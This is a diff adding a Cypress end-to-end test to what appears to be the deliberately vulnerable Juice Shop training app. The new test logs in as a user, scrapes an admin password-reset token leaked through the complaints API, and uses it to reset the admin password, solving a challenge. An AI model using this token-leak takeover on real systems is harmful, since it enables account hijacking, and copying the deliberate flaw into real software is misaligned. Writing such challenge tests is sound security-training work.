@@ -1,4 +1,6 @@
 describe('/#/forgot-password', () => {
+  const unchangedAdminPassword = `admin${123}`
+
   beforeEach(() => {
     cy.get('body').then(($body) => {
       if ($body.find('#logout').length) {
@@ -25,6 +27,44 @@ describe('/#/forgot-password', () => {
 
       cy.get('.confirmation').should('not.be.hidden')
       cy.expectChallengeSolved({ challenge: "Reset Jim's Password" })
+    })
+  })
+
+  describe('as Admin', () => {
+    it('should be able to reset password with a leaked reset token', () => {
+      cy.login({ email: 'jim', password: 'ncc-1701' })
+      cy.visit('/#/forgot-password')
+      cy.task<string>('GetFromConfig', 'application.domain').then(
+        (appDomain: string) => {
+          const email = `admin@${appDomain}`
+          cy.get('#email').type(email)
+          cy.wait('@securityQuestion')
+          cy.window().then((window) => {
+            cy.request({
+              method: 'GET',
+              url: '/api/Complaints/',
+              headers: {
+                Authorization: `Bearer ${window.localStorage.getItem('token')}`
+              }
+            }).then(({ body }) => {
+              const complaint = [...body.data].reverse().find((entry: { message?: string }) => entry.message?.includes(email))
+              if (!complaint) {
+                throw new Error(`No leaked reset token complaint found for ${email}`)
+              }
+              const token = complaint?.message?.match(/: ([a-f0-9]{32})$/i)?.[1]
+
+              expect(token).to.match(/^[a-f0-9]{32}$/)
+              cy.get('#securityAnswer').should('not.be.disabled').focus().type(token)
+            })
+          })
+        }
+      )
+      cy.get('#newPassword').focus().type(unchangedAdminPassword)
+      cy.get('#newPasswordRepeat').focus().type(unchangedAdminPassword)
+      cy.get('#resetButton').click()
+
+      cy.get('.confirmation').should('not.be.hidden')
+      cy.expectChallengeSolved({ challenge: "Reset Admin's Password" })
     })
   })
 
